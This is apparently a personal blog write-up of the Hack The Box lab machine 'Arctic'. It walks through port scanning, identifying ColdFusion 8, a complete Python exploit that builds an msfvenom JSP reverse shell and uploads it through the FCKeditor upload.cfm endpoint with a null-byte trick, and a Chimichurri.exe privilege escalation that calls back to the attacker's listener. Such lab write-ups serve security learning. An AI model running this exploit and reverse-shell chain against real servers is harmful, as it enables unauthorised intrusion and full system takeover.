---
title: "Arctic"
date: 2023-08-22T22:29:45+02:00
tags: ["windows","web","privesc"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Arctic
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Arctic

![Untitled](/HTB/arctic-icon.png)

## Tools Used

- nmap
- searchsploit
- chimichurri.exe

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
   6   │ PORT      STATE SERVICE REASON          VERSION
   7   │ 135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
   8   │ 8500/tcp  open  fmtp?   syn-ack ttl 127
   9   │ 49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
  10   │ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan shows three open:

2 **rpc** ports on **135** and **49154**

A **fmtp** port on **8500** and our point of entry.

## Enumeration

Googling I found that **fmtp** port is **a** communication stack based on the transmission control and internet protocols. It helps to understand a little bit more what we have in front of us.

I tried to connect via **netcat** to this port.

![Untitled](/HTB/arctic-1.png)

But doesn’t output nothing.

With curl I test if there is a answer for a http request with **GET** method.

![Untitled](/HTB/arctic-2.png)

The answer had a 30s delay but we know now that is running a website.

![Untitled](/HTB/arctic-3.png)

The website leaks two directories `CFIDE` and `cfdocs` which makes me think that we are in front of a ColdFusion.

ColdFusion is a commercial rapid web-application development computing platform.

As the website is extremely slow we are not brute forcing the website.

![Untitled](/HTB/arctic-4.png)

Navigating throw the folders we can find one interesting root `/CFIDE/administrator` which is a login page for **ColdFusion v8**, I tried default/common credentials but no one worked, so let’s check if there is some exploit for it.

## Exploiting

![Untitled](/HTB/arctic-5.png)

We have one exploit with **RCE** so let’s check what it does.

```python
#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

rhost = "10.10.10.11"  # Dirección IP del host de destino
rport = 8500           # Puerto del host de destino
lhost = "10.10.14.9"   # Dirección IP de tu máquina (el atacante)
lport = 4444           # Puerto en tu máquina para recibir la conexión inversa
filename = uuid.uuid4().hex

class MultiPartForm:

    def __init__(self):
        self.files = []
        self.boundary = uuid.uuid4().hex.encode('utf-8')
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()

        if mimetype is None:
            mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

        self.files.append((fieldname, filename, mimetype, body))
        return

    @staticmethod
    def _attached_file(name, filename):
        return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

    @staticmethod
    def _content_type(ct):
        return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

    def __bytes__(self):
        buffer = io.BytesIO()
        boundary = b'--' + self.boundary + b'\r\n'

        for f_name, filename, f_content_type, body in self.files:
            buffer.write(boundary)
            buffer.write(self._attached_file(f_name, filename))
            buffer.write(self._content_type(f_content_type))
            buffer.write(b'\r\n')
            buffer.write(body)
            buffer.write(b'\r\n')

        buffer.write(b'--' + self.boundary + b'--\r\n')
        return buffer.getvalue()

def execute_payload():
    print('\nExecuting the payload...')
    print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

def listen_connection():
    print('\nListening for connection...')
    os.system(f'nc -lv {lport}')

if __name__ == '__main__':
    # Define some information
    lhost = "10.10.14.9"
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex

    # Generate a payload that connects back and spawns a command shell
    print("\nGenerating a payload...")
    os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')

    # Encode the form data
    form = MultiPartForm()
    form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb'))
    data = bytes(form)

    # Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00', data=data)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(data))

    # Print the request
    print('\nPriting request...')

    for name, value in request.header_items():
        print(f'{name}: {value}')

    print('\n' + request.data.decode('utf-8'))

    # Send the request and print the response
    print('\nSending request and printing response...')
    print(urllib.request.urlopen(request).read().decode('utf-8'))

    # Print some information
    print('\nPrinting some information for debugging...')
    print(f'lhost: {lhost}')
    print(f'lport: {lport}')
    print(f'rhost: {rhost}')
    print(f'rport: {rport}')
    print(f'payload: {filename}.jsp')

    # Delete the payload
    print("\nDeleting the payload...")
    os.system(f'rm {filename}.jsp')

    # Listen for connections and execute the payload
    p1 = Process(target=listen_connection)
    p1.start()
    p2 = Process(target=execute_payload)
    p2.start()
    p1.join()
    p2.join()
```

```bash
http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00
```

The exploit access to the above url to execute an upload resource which help us to upload a **jsp** reverse shell, then the exploit access to the next url.

```bash
http://{rhost}:{rport}/userfiles/file/{filename}.jsp
```

I wonder that it’s where the reverse shell is uploaded.

## Gaining an Initial Foothold

Once executed we gain access as **tolis**.

![Untitled](/HTB/arctic-6.png)

Let’s cat the **user’s flag**.

![Untitled](/HTB/arctic-7.png)

## Escalating Privilege

Now let’s elevate the privileges.

First let’s see what operating system we are using

```powershell
systeminfo
```

```powershell
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          23/8/2023, 9:42:49 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.024 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.203 MB
Virtual Memory: In Use:    1.082 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

This version is `Microsoft Windows Server 2008 R2 Standard` as we know is vulnerable to **MS10-059** which we have already **privesc** in the [Bastard](http://pwndside.github.io/posts/bastard-htb) machine so I am going to skip that part and go to direct to the execution of **Chimichurri.exe** in order to **privesc**.

```powershell
nc -lv 4445
```

```powershell
.\Chimichurri 10.10.14.9 4445
```

![Untitled](/HTB/arctic-8.png)

![Untitled](/HTB/arctic-9.webp)

Let’s cat the **root’s flag**.

![Untitled](/HTB/arctic-10.png)

**Thank you for reading, and happy hacking! 😄**